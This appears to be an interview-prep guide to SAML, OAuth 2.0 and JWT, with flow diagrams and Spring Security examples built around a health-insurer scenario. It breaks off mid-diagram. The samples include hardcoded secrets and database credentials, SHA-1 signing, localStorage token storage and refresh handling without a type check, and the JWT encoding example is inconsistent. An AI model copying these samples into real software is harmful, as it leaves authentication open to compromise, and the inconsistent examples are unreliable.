# SAML, OAuth 2.0, and JWT: Complete Technical Guide

**Author:** Technical Interview Preparation  
**Date:** June 2026  
**Purpose:** Comprehensive guide for authentication and authorization protocols

---

## Table of Contents

1. [Introduction](#introduction)
2. [SAML (Security Assertion Markup Language)](#saml)
3. [OAuth 2.0](#oauth-20)
4. [JWT (JSON Web Token)](#jwt)
5. [Comparison & Use Cases](#comparison--use-cases)
6. [Real-World Implementation](#real-world-implementation)
7. [Interview Q&A](#interview-qa)
8. [Best Practices & Security](#best-practices--security)

---

## Introduction

Modern applications require secure authentication and authorization. Three key standards solve different problems:

- **SAML**: Enterprise Single Sign-On (SSO)
- **OAuth 2.0**: Delegated Authorization (third-party access)
- **JWT**: Stateless Token Format (API authentication)

These protocols often work together to create comprehensive security solutions.

---

## SAML (Security Assertion Markup Language)

### What is SAML?

SAML is an **XML-based open standard** for exchanging authentication and authorization information between systems. It enables **federated identity management** — users authenticate once and access multiple systems without re-entering credentials.

### Key Concepts

| Term | Definition |
|------|-----------|
| **Service Provider (SP)** | Application user wants to access (e.g., member portal) |
| **Identity Provider (IdP)** | System that authenticates user (e.g., Okta, Active Directory) |
| **Assertion** | XML document containing user identity and authentication info |
| **Binding** | Protocol for transmitting SAML messages (HTTP Redirect, HTTP POST) |
| **Metadata** | Configuration XML describing SP and IdP capabilities |

### SAML Flow

```
SAML Authentication Flow
=======================

1. User Access
   └─ User (Browser) → Service Provider (Member Portal)
      └─ "I want to login"

2. Redirect to IdP
   └─ Service Provider → Identity Provider (Okta)
      └─ "This user needs authentication"
      └─ Redirect URI contains SAML AuthnRequest

3. User Authentication
   └─ Identity Provider → User (Browser)
      └─ "Please enter your credentials"
   └─ User → Identity Provider
      └─ Username: john@careFirst.com
      └─ Password: ****

4. Create Assertion
   └─ Identity Provider creates SAML Assertion:
      ├─ <Subject>john@careFirst.com</Subject>
      ├─ <Attribute Name="role">MEMBER</Attribute>
      ├─ <Attribute Name="email">john@careFirst.com</Attribute>
      ├─ <Conditions NotOnOrAfter="2026-06-05T15:30:00Z"/>
      └─ <Signature>⚡️ Digitally Signed ⚡️</Signature>

5. Return to Service Provider
   └─ Identity Provider → Service Provider
      └─ HTTP POST with SAML Response
      └─ Contains digitally signed assertion

6. Validate & Create Session
   └─ Service Provider:
      ├─ Verifies IdP's signature
      ├─ Checks assertion not expired
      ├─ Extracts user identity and roles
      └─ Creates session for user

7. User Authenticated
   └─ Service Provider → User (Browser)
      └─ "Welcome john.doe@careFirst.com!"
      └─ Create session cookie
      └─ Redirect to member dashboard
```

### SAML Assertion Example

```xml
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response 
    xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    ID="_8e8dc5f69a98cc4c1ff3427e5ce34606fd672f91e6"
    Version="2.0"
    IssueInstant="2026-06-05T14:30:00Z"
    Destination="https://careFirst.com/saml/acs">
    
    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
        https://careFirst.okta.com
    </saml:Issuer>
    
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    
    <saml:Assertion 
        xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
        Version="2.0"
        ID="_3ee3819b9e6804d265f8a4dcaf47f2bcf1eeda8ecd"
        IssueInstant="2026-06-05T14:30:00Z">
        
        <saml:Subject>
            <saml:NameID Format="urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress">
                john.doe@careFirst.com
            </saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData 
                    NotOnOrAfter="2026-06-05T15:35:00Z"
                    Recipient="https://careFirst.com/saml/acs"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        
        <saml:Conditions 
            NotBefore="2026-06-05T14:25:00Z"
            NotOnOrAfter="2026-06-05T15:35:00Z">
            <saml:AudienceRestriction>
                <saml:Audience>https://careFirst.com</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        
        <saml:AuthnStatement AuthnInstant="2026-06-05T14:30:00Z">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>
                    urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport
                </saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        
        <saml:AttributeStatement>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>john.doe@careFirst.com</saml:AttributeValue>
            </saml:Attribute>
            
            <saml:Attribute Name="firstName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>John</saml:AttributeValue>
            </saml:Attribute>
            
            <saml:Attribute Name="lastName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>Doe</saml:AttributeValue>
            </saml:Attribute>
            
            <saml:Attribute Name="role" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>MEMBER</saml:AttributeValue>
            </saml:Attribute>
            
            <saml:Attribute Name="memberId" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>MEM123456789</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
        
        <!-- Digital Signature -->
        <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
            <ds:SignedInfo>
                <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                <ds:SignatureMethod Algorithm="http://www.w3.org/2000/09/xmldsig#rsa-sha1"/>
                <ds:Reference URI="#_3ee3819b9e6804d265f8a4dcaf47f2bcf1eeda8ecd">
                    <ds:Transforms>
                        <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
                        <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
                    </ds:Transforms>
                    <ds:DigestMethod Algorithm="http://www.w3.org/2000/09/xmldsig#sha1"/>
                    <ds:DigestValue>xvlc4NyEd8f5z8K2m9P1q2R3s4T5u6</ds:DigestValue>
                </ds:Reference>
            </ds:SignedInfo>
            <ds:SignatureValue>
                H5dBSW7vC8rK3hJ2mP8qL9nO6rT4yU1vW2xX3yY4zZ5aA6bB7cC8dD9eE0fF1gG2hH3iI4jJ5kK6lL7mM8nN9oO0pP1qQ2rR3sS4tT5uU6vV7wW8xX9yY0zZ
            </ds:SignatureValue>
            <ds:KeyInfo>
                <ds:X509Data>
                    <ds:X509Certificate>
                        MIICajCCAd...
                    </ds:X509Certificate>
                </ds:X509Data>
            </ds:KeyInfo>
        </ds:Signature>
    </saml:Assertion>
</samlp:Response>
```

### SAML Characteristics

| Characteristic | Details |
|---|---|
| **Format** | XML (verbose, human-readable) |
| **Authentication** | ✅ Yes (IdP verifies user identity) |
| **Authorization** | ✅ Yes (attributes contain user roles) |
| **Signature** | Digital signature (RSA) |
| **Assertion Lifespan** | 5-60 minutes |
| **Transport** | HTTP Redirect or HTTP POST |
| **Best For** | Enterprise SSO, Federated Identity |
| **Complexity** | Medium (XML parsing required) |
| **Mobile Friendly** | Poor (browser-based, XML) |

### SAML Implementation (Spring Security)

```java
@Configuration
@EnableWebSecurity
public class SamlSecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // SAML 2.0 Login Configuration
            .saml2Login()
                .relyingPartyRegistrationRepository(relyingPartyRegistrationRepository())
                .and()
            // Authorization Rules
            .authorizeHttpRequests((authz) -> authz
                .requestMatchers("/public/**").permitAll()
                .requestMatchers("/member/**").hasRole("MEMBER")
                .requestMatchers("/provider/**").hasRole("PROVIDER")
                .requestMatchers("/admin/**").hasRole("ADMIN")
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
    
    @Bean
    public RelyingPartyRegistrationRepository relyingPartyRegistrationRepository() {
        RelyingPartyRegistration okta = RelyingPartyRegistration
            .withRegistrationId("okta")
            // Service Provider (Consumer) details
            .assertionConsumerServiceLocation("https://careFirst.com/saml/acs")
            .entityId("https://careFirst.com/saml/metadata")
            // Identity Provider details
            .idpWebSsoEndpoint("https://careFirst.okta.com/app/careFirst/exk123/sso/saml")
            .idpCertificate(certificate) // Okta's public certificate
            .build();
        
        return new InMemoryRelyingPartyRegistrationRepository(okta);
    }
}

// SAML Assertion Consumer Service (ACS) endpoint
@RestController
@RequestMapping("/saml")
public class SamlController {
    
    @PostMapping("/acs")
    public String samlAcs() {
        // Spring Security automatically handles SAML response
        // Validates signature, checks expiration
        // Creates session for authenticated user
        return "redirect:/dashboard";
    }
}
```

---

## OAuth 2.0

### What is OAuth 2.0?

OAuth 2.0 is an **open authorization protocol** that enables users to grant **third-party applications** access to their resources **without sharing passwords**. It separates authentication (who you are) from authorization (what you can access).

### Key Concepts

| Term | Definition |
|------|-----------|
| **Resource Owner** | User who owns the data (e.g., member) |
| **Client** | Third-party app requesting access (e.g., Apple Health) |
| **Authorization Server** | Issues access tokens (e.g., CareFirst Auth Server) |
| **Resource Server** | Holds user data, validates tokens (e.g., CareFirst API) |
| **Access Token** | Bearer token granting access to resources |
| **Refresh Token** | Long-lived token used to get new access token |
| **Scope** | Permission level (e.g., "read:claims", "read:benefits") |

### OAuth 2.0 Grant Types

#### 1. Authorization Code Grant (Most Common)

Used for web applications and mobile apps. User grants permission, app receives authorization code, code exchanged for access token on backend.

```
Flow:
1. User clicks "Connect to CareFirst" in Apple Health
2. Apple Health redirects to: 
   https://careFirst.com/oauth/authorize?
     client_id=apple_health_app&
     redirect_uri=https://apple.com/callback&
     scope=read:claims,read:benefits&
     response_type=code

3. CareFirst shows consent screen:
   "Apple Health wants to:
    - Read your claims
    - Read your benefits
    Approve? [Allow] [Deny]"

4. User clicks "Allow"

5. CareFirst generates authorization code:
   code=auth_code_abc123xyz
   Redirects to:
   https://apple.com/callback?code=auth_code_abc123xyz

6. Apple Health backend (secure) exchanges code for token:
   POST https://careFirst.com/oauth/token
   client_id=apple_health_app
   client_secret=secret_key_xyz
   code=auth_code_abc123xyz
   grant_type=authorization_code

7. CareFirst returns:
   {
     "access_token": "eyJhbGciOiJIUzI1NiIs...",
     "token_type": "Bearer",
     "expires_in": 3600,
     "refresh_token": "refresh_token_xyz"
   }

8. Apple Health uses access token for API calls:
   GET https://careFirst.com/api/claims
   Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
   
   Response: { claims: [...] }
```

#### 2. Client Credentials Grant

Service-to-service authentication. No user involved.

```
Flow:
1. Service A needs to call Service B
2. Service A sends credentials:
   POST https://service-b.com/oauth/token
   client_id=service_a
   client_secret=secret_xyz
   grant_type=client_credentials
   scope=service:access

3. Service B returns access token:
   {
     "access_token": "eyJhbGciOiJSUzI1NiIs...",
     "token_type": "Bearer",
     "expires_in": 3600
   }

4. Service A uses token:
   POST https://service-b.com/api/process
   Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

#### 3. Implicit Grant (Deprecated)

Older flow for single-page apps. Direct token issuance without authorization code.

#### 4. Resource Owner Password Grant (Legacy)

User provides password directly. Avoided if possible due to security concerns.

### OAuth 2.0 Scopes

Scopes define what access a token grants:

```
read:claims      - Read member claims
read:benefits    - Read benefit information
write:profile    - Update member profile
read:providers   - Access provider directory
admin:users      - Manage users (admin only)
```

### OAuth 2.0 Implementation (Spring Security)

```java
@Configuration
public class OAuthServerConfig {
    
    // OAuth 2.0 Authorization Server Configuration
    @Bean
    public SecurityFilterChain authorizationServerSecurityFilterChain(HttpSecurity http) throws Exception {
        OAuth2AuthorizationServerConfigurer authorizationServerConfigurer =
            new OAuth2AuthorizationServerConfigurer();
        
        http
            .apply(authorizationServerConfigurer)
                .authorizationEndpoint(authEndpoint -> authEndpoint
                    .consentPage("/oauth/consent") // Custom consent screen
                )
                .tokenEndpoint(tokenEndpoint -> tokenEndpoint
                    .accessTokenRequestConverter(
                        new OAuth2ClientCredentialsAuthenticationConverter()
                    )
                )
            .and()
            .authorizeHttpRequests(authz -> authz
                .requestMatchers("/oauth/**").permitAll()
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
}

// OAuth 2.0 Client Registration Repository
@Configuration
public class ClientRegistrationConfig {
    
    @Bean
    public RegisteredClientRepository registeredClientRepository() {
        RegisteredClient appleHealth = RegisteredClient
            .withId(UUID.randomUUID().toString())
            .clientId("apple_health_app")
            .clientSecret("secret_key_xyz")
            .clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC)
            .authorizationGrantType(AuthorizationGrantType.AUTHORIZATION_CODE)
            .authorizationGrantType(AuthorizationGrantType.REFRESH_TOKEN)
            .redirectUri("https://apple.com/callback")
            .scope("read:claims")
            .scope("read:benefits")
            .tokenSettings(TokenSettings.builder()
                .accessTokenTimeToLive(Duration.ofHours(1))
                .refreshTokenTimeToLive(Duration.ofDays(30))
                .reuseRefreshTokens(false)
                .build()
            )
            .build();
        
        return new InMemoryRegisteredClientRepository(appleHealth);
    }
}

// Authorization Endpoint
@RestController
@RequestMapping("/oauth")
public class OAuthController {
    
    @GetMapping("/authorize")
    public String authorize(
            @RequestParam String client_id,
            @RequestParam String redirect_uri,
            @RequestParam String scope,
            @RequestParam String response_type,
            Model model) {
        
        // Show consent screen
        model.addAttribute("clientId", client_id);
        model.addAttribute("scopes", scope.split(","));
        
        return "oauth/consent"; // Thymeleaf template
    }
    
    @PostMapping("/authorize")
    public String authorizeApproval(
            @RequestParam String client_id,
            @RequestParam String redirect_uri,
            @RequestParam String[] scopes) {
        
        // Generate authorization code
        String authCode = generateAuthorizationCode(client_id, scopes);
        
        // Redirect back to client with code
        return "redirect:" + redirect_uri + "?code=" + authCode;
    }
    
    @PostMapping("/token")
    public ResponseEntity<?> token(
            @RequestParam String grant_type,
            @RequestParam String client_id,
            @RequestParam String client_secret,
            @RequestParam(required = false) String code,
            @RequestParam(required = false) String refresh_token) {
        
        // Verify client credentials
        if (!isValidClient(client_id, client_secret)) {
            return ResponseEntity.status(401).build();
        }
        
        if ("authorization_code".equals(grant_type)) {
            // Authorization Code Grant
            AuthorizationCode authCode = findAuthCode(code);
            if (authCode == null || authCode.isExpired()) {
                return ResponseEntity.status(401).build();
            }
            
            String accessToken = generateAccessToken(
                authCode.getUserId(),
                authCode.getScopes()
            );
            String newRefreshToken = generateRefreshToken(authCode.getUserId());
            
            return ResponseEntity.ok(new TokenResponse(
                accessToken,
                "Bearer",
                3600,
                newRefreshToken
            ));
        } else if ("refresh_token".equals(grant_type)) {
            // Refresh Token Grant
            RefreshTokenEntity rt = findRefreshToken(refresh_token);
            if (rt == null || rt.isExpired()) {
                return ResponseEntity.status(401).build();
            }
            
            String accessToken = generateAccessToken(
                rt.getUserId(),
                rt.getScopes()
            );
            
            return ResponseEntity.ok(new TokenResponse(
                accessToken,
                "Bearer",
                3600
            ));
        }
        
        return ResponseEntity.badRequest().build();
    }
}

// Resource Server - Validates OAuth tokens
@Configuration
public class ResourceServerConfig {
    
    @Bean
    public SecurityFilterChain resourceServerSecurityFilterChain(HttpSecurity http) throws Exception {
        http
            .oauth2ResourceServer()
                .jwt()
                    .decoder(jwtDecoder())
            .and()
            .and()
            .authorizeHttpRequests((authz) -> authz
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/claims/**").hasAuthority("SCOPE_read:claims")
                .requestMatchers("/api/benefits/**").hasAuthority("SCOPE_read:benefits")
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
    
    @Bean
    public JwtDecoder jwtDecoder() {
        return NimbusJwtDecoder.withJwkSetUri(
            "https://careFirst.com/oauth/jwks"
        ).build();
    }
}

// Protected API Endpoint
@RestController
@RequestMapping("/api")
public class ApiController {
    
    @GetMapping("/claims")
    @PreAuthorize("hasAuthority('SCOPE_read:claims')")
    public ResponseEntity<?> getClaims(
            @AuthenticationPrincipal Jwt jwt) {
        
        String userId = jwt.getSubject();
        List<String> scopes = (List<String>) jwt.getClaim("scope");
        
        // Fetch user claims from database
        List<Claim> claims = claimService.findByUserId(userId);
        
        return ResponseEntity.ok(claims);
    }
}
```

### OAuth 2.0 Characteristics

| Characteristic | Details |
|---|---|
| **Format** | JSON |
| **Authentication** | ❌ No (only authorization) |
| **Authorization** | ✅ Yes (scopes define access) |
| **Token Lifespan** | 1 hour (short-lived) |
| **Best For** | Third-party app integration |
| **Complexity** | Medium |
| **Mobile Friendly** | ✅ Yes |
| **Stateless** | ✅ Yes |
| **Self-Contained** | ❌ No (requires token introspection) |

---

## JWT (JSON Web Token)

### What is JWT?

JWT is a **compact, self-contained token format** for securely transmitting information between parties as JSON objects. A JWT is digitally signed, so it can be **verified and trusted**.

### JWT Structure

A JWT consists of three parts separated by dots (`.`):

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

^                                          ^                                            ^
HEADER                                     PAYLOAD                                      SIGNATURE
```

#### 1. Header (Algorithm & Token Type)

```json
{
  "alg": "HS256",  // Algorithm: HMAC SHA-256
  "typ": "JWT"     // Type: JSON Web Token
}
```

Encoded in Base64URL:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

#### 2. Payload (Claims)

Contains user information and metadata:

```json
{
  // Registered Claims (Standard)
  "sub": "12345",                    // Subject (user ID)
  "iat": 1717584000,                 // Issued At
  "exp": 1717587600,                 // Expiration Time
  "iss": "https://careFirst.com",    // Issuer
  "aud": "careFirst-mobile-app",     // Audience
  
  // Custom Claims (Application-specific)
  "email": "john.doe@careFirst.com",
  "name": "John Doe",
  "roles": ["MEMBER"],
  "memberId": "MEM123456789",
  "permissions": ["read:claims", "read:benefits"]
}
```

Encoded in Base64URL:
```
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ
```

#### 3. Signature

Verifies that token hasn't been tampered with:

```
SIGNATURE = HMACSHA256(
  base64(header) + "." + base64(payload),
  secret_key
)
```

For HS256 (symmetric):
```
key = "my-secret-key-for-signing"
signature = HMACSHA256(base64_header.base64_payload, key)
         = SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

For RS256 (asymmetric):
```
private_key = server_private_key
signature = RSA(base64_header.base64_payload, private_key)
```

### JWT Authentication Flow

```
JWT Web Flow
=============

1. User Login
   ├─ User (Browser) → Spring Boot API
   │  ├─ POST /api/auth/login
   │  └─ { "email": "john@careFirst.com", "password": "****" }
   │
   ├─ Spring Boot validates credentials
   │  └─ Check against database
   │
   └─ Credentials valid ✓

2. Generate JWT
   ├─ Create token payload:
   │  {
   │    "sub": "12345",
   │    "email": "john@careFirst.com",
   │    "roles": ["MEMBER"],
   │    "iat": 1717584000,
   │    "exp": 1717587600
   │  }
   │
   └─ Sign with secret key

3. Return JWT to Client
   ├─ Spring Boot → User (Browser)
   └─ {
        "access_token": "eyJhbGciOiJIUzI1NiIs...",
        "token_type": "Bearer",
        "expires_in": 3600
      }

4. Client Stores Token
   ├─ Browser stores in secure storage
   │  (localStorage, sessionStorage, or secure cookie)
   │
   └─ Mobile app stores in secure keystore

5. API Request with JWT
   ├─ User (Browser) → Spring Boot API
   │  ├─ GET /api/claims
   │  └─ Header: Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
   │
   └─ Backend receives request

6. Validate JWT
   ├─ Extract token from Authorization header
   ├─ Split into header.payload.signature
   ├─ Verify signature:
   │  └─ HMACSHA256(header.payload, secret) == signature
   ├─ Check expiration:
   │  └─ Current time < token exp claim
   ├─ Extract claims:
   │  └─ user_id = payload.sub = "12345"
   │
   └─ All validation passed ✓

7. Authorize Request
   ├─ Extract user roles from token
   │  └─ roles = payload.roles = ["MEMBER"]
   ├─ Check route authorization
   │  └─ /api/claims requires MEMBER role ✓
   │
   └─ Authorization passed ✓

8. Process Request
   ├─ Spring Security context set with user details
   ├─ Load user claims from database
   ├─ Return response to browser
   │
   └─ Response: { "claims": [...] }

9. Refresh Token (When Expired)
   ├─ User receives 401 Unauthorized
   ├─ Browser uses refresh token:
   │  POST /api/auth/refresh
   │  { "refresh_token": "refresh_xyz" }
   ├─ Server validates refresh token
   ├─ Returns new access token
   │
   └─ Browser retries request with new token
```

### JWT Implementation (Spring Security)

```java
@Component
public class JwtTokenProvider {
    
    @Value("${jwt.secret}")
    private String jwtSecret; // "my-super-secret-key-change-in-production"
    
    @Value("${jwt.access-token-expiration}")
    private long accessTokenExpirationMs; // 3600000 (1 hour)
    
    @Value("${jwt.refresh-token-expiration}")
    private long refreshTokenExpirationMs; // 604800000 (7 days)
    
    /**
     * Generate JWT after successful authentication
     */
    public String generateAccessToken(Authentication authentication) {
        UserPrincipal userPrincipal = (UserPrincipal) authentication.getPrincipal();
        
        Date now = new Date();
        Date expiryDate = new Date(now.getTime() + accessTokenExpirationMs);
        
        return Jwts.builder()
            // Header (implicit HS256 algorithm)
            
            // Payload (Claims)
            .setSubject(String.valueOf(userPrincipal.getId()))
            .claim("email", userPrincipal.getEmail())
            .claim("roles", userPrincipal.getAuthorities()
                .stream()
                .map(GrantedAuthority::getAuthority)
                .collect(Collectors.toList())
            )
            .claim("name", userPrincipal.getName())
            
            // Timestamps
            .setIssuedAt(now)
            .setExpiration(expiryDate)
            
            // Signature (HMAC SHA-256)
            .signWith(SignatureAlgorithm.HS256, jwtSecret)
            
            // Compact serialization (header.payload.signature)
            .compact();
    }
    
    /**
     * Generate refresh token for getting new access token
     */
    public String generateRefreshToken(String userId) {
        Date now = new Date();
        Date expiryDate = new Date(now.getTime() + refreshTokenExpirationMs);
        
        return Jwts.builder()
            .setSubject(userId)
            .claim("type", "refresh")
            .setIssuedAt(now)
            .setExpiration(expiryDate)
            .signWith(SignatureAlgorithm.HS256, jwtSecret)
            .compact();
    }
    
    /**
     * Validate JWT signature and expiration
     */
    public boolean validateToken(String token) {
        try {
            Jwts.parser()
                .setSigningKey(jwtSecret)
                .parseClaimsJws(token); // Throws exception if invalid
            return true;
        } catch (JwtException | IllegalArgumentException e) {
            return false; // Invalid or expired
        }
    }
    
    /**
     * Extract user ID from token
     */
    public String getUserIdFromToken(String token) {
        Claims claims = Jwts.parser()
            .setSigningKey(jwtSecret)
            .parseClaimsJws(token)
            .getBody();
        
        return claims.getSubject();
    }
    
    /**
     * Extract all claims from token
     */
    public Claims getClaimsFromToken(String token) {
        return Jwts.parser()
            .setSigningKey(jwtSecret)
            .parseClaimsJws(token)
            .getBody();
    }
}

// JWT Authentication Filter
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Autowired
    private JwtTokenProvider tokenProvider;
    
    @Autowired
    private UserDetailsService userDetailsService;
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
            HttpServletResponse response, FilterChain filterChain)
            throws ServletException, IOException {
        
        try {
            // Extract JWT from Authorization header
            String token = getJwtFromRequest(request);
            
            if (token != null && tokenProvider.validateToken(token)) {
                // Token valid → Extract user info and set authentication
                String userId = tokenProvider.getUserIdFromToken(token);
                UserDetails userDetails = userDetailsService.loadUserByUsername(userId);
                
                // Create authentication object
                UsernamePasswordAuthenticationToken authentication =
                    new UsernamePasswordAuthenticationToken(
                        userDetails,
                        null,
                        userDetails.getAuthorities()
                    );
                
                // Set in security context
                SecurityContextHolder.getContext().setAuthentication(authentication);
            }
        } catch (Exception ex) {
            // Invalid token → Continue without authentication
            logger.error("Could not set user authentication", ex);
        }
        
        filterChain.doFilter(request, response);
    }
    
    /**
     * Extract JWT from "Authorization: Bearer <token>" header
     */
    private String getJwtFromRequest(HttpServletRequest request) {
        String bearerToken = request.getHeader("Authorization");
        if (bearerToken != null && bearerToken.startsWith("Bearer ")) {
            return bearerToken.substring(7); // Remove "Bearer " prefix
        }
        return null;
    }
}

// Login Endpoint
@RestController
@RequestMapping("/api/auth")
public class AuthController {
    
    @Autowired
    private AuthenticationManager authenticationManager;
    
    @Autowired
    private JwtTokenProvider tokenProvider;
    
    @Autowired
    private RefreshTokenRepository refreshTokenRepository;
    
    @PostMapping("/login")
    public ResponseEntity<?> login(@Valid @RequestBody LoginRequest loginRequest) {
        try {
            // Authenticate user (validates email/password)
            Authentication authentication = authenticationManager.authenticate(
                new UsernamePasswordAuthenticationToken(
                    loginRequest.getEmail(),
                    loginRequest.getPassword()
                )
            );
            
            // User authenticated ✓
            SecurityContextHolder.getContext().setAuthentication(authentication);
            
            // Generate tokens
            String accessToken = tokenProvider.generateAccessToken(authentication);
            String refreshToken = tokenProvider.generateRefreshToken(
                authentication.getName()
            );
            
            // Save refresh token to database
            refreshTokenRepository.save(new RefreshToken(
                authentication.getName(),
                refreshToken
            ));
            
            return ResponseEntity.ok(new JwtAuthenticationResponse(
                accessToken,
                refreshToken,
                "Bearer",
                3600 // expires_in: 1 hour
            ));
        } catch (AuthenticationException e) {
            return ResponseEntity.status(401)
                .body(new ErrorResponse("Invalid credentials"));
        }
    }
    
    @PostMapping("/refresh")
    public ResponseEntity<?> refreshToken(
            @Valid @RequestBody RefreshTokenRequest request) {
        
        try {
            // Validate refresh token
            if (!tokenProvider.validateToken(request.getRefreshToken())) {
                return ResponseEntity.status(401)
                    .body(new ErrorResponse("Invalid refresh token"));
            }
            
            String userId = tokenProvider.getUserIdFromToken(
                request.getRefreshToken()
            );
            UserDetails userDetails = userDetailsService.loadUserByUsername(userId);
            
            // Generate new access token
            Authentication authentication = new UsernamePasswordAuthenticationToken(
                userDetails,
                null,
                userDetails.getAuthorities()
            );
            String accessToken = tokenProvider.generateAccessToken(authentication);
            
            return ResponseEntity.ok(new JwtAuthenticationResponse(
                accessToken,
                request.getRefreshToken(),
                "Bearer",
                3600
            ));
        } catch (Exception e) {
            return ResponseEntity.status(401)
                .body(new ErrorResponse("Failed to refresh token"));
        }
    }
}

// Protected API Endpoint
@RestController
@RequestMapping("/api/claims")
public class ClaimsController {
    
    @Autowired
    private ClaimService claimService;
    
    @GetMapping
    @PreAuthorize("hasRole('MEMBER')")
    public ResponseEntity<?> getMyClaims(
            @AuthenticationPrincipal UserDetails userDetails) {
        
        String userId = userDetails.getUsername();
        List<Claim> claims = claimService.findByUserId(userId);
        
        return ResponseEntity.ok(claims);
    }
}
```

### JWT Configuration (application.yml)

```yaml
jwt:
  secret: ${JWT_SECRET:your-secret-key-change-in-production}
  access-token-expiration: 3600000  # 1 hour in milliseconds
  refresh-token-expiration: 604800000  # 7 days in milliseconds

spring:
  jpa:
    hibernate:
      ddl-auto: update
  datasource:
    url: jdbc:mysql://localhost:3306/careFirst
    username: root
    password: password
```

### JWT Characteristics

| Characteristic | Details |
|---|---|
| **Format** | JSON (compact, Base64URL encoded) |
| **Authentication** | ✅ Yes (claims identify user) |
| **Authorization** | ✅ Yes (roles/permissions in token) |
| **Token Lifespan** | 15 minutes - 1 hour |
| **Refresh Token** | Yes (7-30 days) |
| **Best For** | API authentication, mobile apps, microservices |
| **Complexity** | Low (JSON parsing simple) |
| **Mobile Friendly** | ✅ Yes (JSON-based) |
| **Stateless** | ✅ Yes (no server lookup) |
| **Self-Contained** | ✅ Yes (all claims in token) |

---

## Comparison & Use Cases

### Feature Comparison Table

| Feature | SAML | OAuth 2.0 | JWT |
|---------|------|----------|-----|
| **Standard Type** | Authentication | Authorization | Token Format |
| **Format** | XML | JSON | JSON |
| **Primary Use** | Enterprise SSO | Third-party access | API/Stateless Auth |
| **Complexity** | Medium | Medium | Low |
| **Size** | Large (XML) | Medium | Small (compact) |
| **Authentication** | ✅ Yes | ❌ No | ✅ Yes |
| **Authorization** | ✅ Yes | ✅ Yes | ✅ Yes |
| **Token Type** | Assertion | Access Token | Self-signed JWT |
| **Token Lifespan** | 5-60 min | 1 hour | 15 min - 1 hour |
| **Mobile Friendly** | ❌ Poor | ✅ Good | ✅ Excellent |
| **Stateless** | ❌ No | ✅ Yes | ✅ Yes |
| **Signature** | Digital (RSA) | JWT (RS256/HS256) | HMAC/RSA |
| **Best For** | Enterprise | API Integration | Microservices |
| **Industry** | Enterprise/Banking | Social Media/SaaS | Modern APIs |

### When to Use Each

#### Use SAML When:
- Building enterprise applications
- Integrating with Active Directory or corporate identity systems
- Supporting federated SSO across multiple enterprise systems
- Compliance requirements (healthcare, finance) mandate XML standards
- Users authenticate once and access multiple internal systems

**Real-world example:** CareFirst corporate employees logging in via Okta to access internal systems.

#### Use OAuth 2.0 When:
- Third-party applications need user data
- Delegating authorization without sharing passwords
- Integrating with social login (Login with Google, Facebook)
- Mobile applications need secure API access
- Supporting "Connect to [Service]" functionality

**Real-world example:** Apple Health accessing member benefits from CareFirst.

#### Use JWT When:
- Building modern REST APIs
- Microservice architecture where stateless auth is needed
- Mobile applications (native iOS/Android)
- Single-page applications (React, Angular, Vue)
- API authentication without server-side session lookup
- Machine-to-machine authentication between services

**Real-world example:** CareFirst mobile app authenticating users and calling APIs.

### Combined Usage: CareFirst Architecture

```
CareFirst Complete Authentication Stack
========================================

┌─────────────────────────────────────────────────────┐
│            Corporate Users                          │
│         (Ford IT Staff)                             │
└────────────────┬────────────────────────────────────┘
                 │
                 ├─ SAML with Okta IdP
                 │
                 ↓
         ┌───────────────┐
         │ Member Portal │
         │ (Web Browser) │
         └───────────────┘

┌─────────────────────────────────────────────────────┐
│           Member Users                              │
│      (CareFirst Members)                            │
└────────────┬──────────────────────────────────────┬─┘
             │                                      │
             ├─ JWT for Mobile App                  │
             │  (Native iOS/Android)                │
             │                                      │
